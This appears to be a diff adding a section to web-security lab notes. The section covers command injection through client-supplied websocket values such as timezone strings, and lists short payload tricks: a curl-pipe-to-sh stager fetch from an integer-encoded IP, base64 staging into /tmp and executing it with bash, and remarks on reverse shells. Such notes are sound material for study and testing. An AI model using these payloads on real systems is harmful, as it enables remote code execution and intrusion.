@@ -248,3 +248,27 @@ X-Forwarded-For: <spoofed-ip>
 5. Send via Repeater — the WAF no longer matches the known pattern; the alert fires and the lab is solved.
 
 **Key insight:** WAF bypasses in WebSocket contexts follow the same obfuscation techniques as HTTP — case variation, alternative event handlers, backtick syntax, encoding.
+
+## Client-controlled "hint" values as websocket command-injection sinks
+
+Custom servers often read a client-supplied ENVIRONMENT HINT from the websocket (browser
+timezone, locale, user-agent, screen size) and pass it to a shell (`TZ=... date`-style output
+rendering). The value never touches a normal input field, so request-level fuzzing misses it;
+read the page JS to see what the client PUSHES on connect/interval, then inject there. `$()`
+substitution in the hint string = command execution with output reflected in the stream's
+normal messages (a timezone string also prints only a leading alphabetic run - route output
+through files, not direct echo).
+
+Short-payload tricks when the sink caps input length (here: hard 31-char validator, "invalid"
+at 32, no char blocklist):
+
+- Encode IPv4 as an integer to shrink it: `192.168.128.212` (15 chars) = `3232268500` (10) -
+  `curl` accepts `curl -sm2 3232268500/r|sh` as a stager fetch.
+- Longer shells: stage a base64 blob into a file with several short `$(printf ...>>/tmp/b)`
+  writes, then `$(base64 -d</tmp/b|bash)`.
+
+Gotcha: a single-threaded websocket app blocks on the spawned process - a hanging
+reverse-shell connection wedges the whole service (~2 min until the TCP timeout unblocks it);
+kill the shell session before doing more web work on the same app.
+
+<!-- promoted-slug: websocket-client-hint-cmdi -->
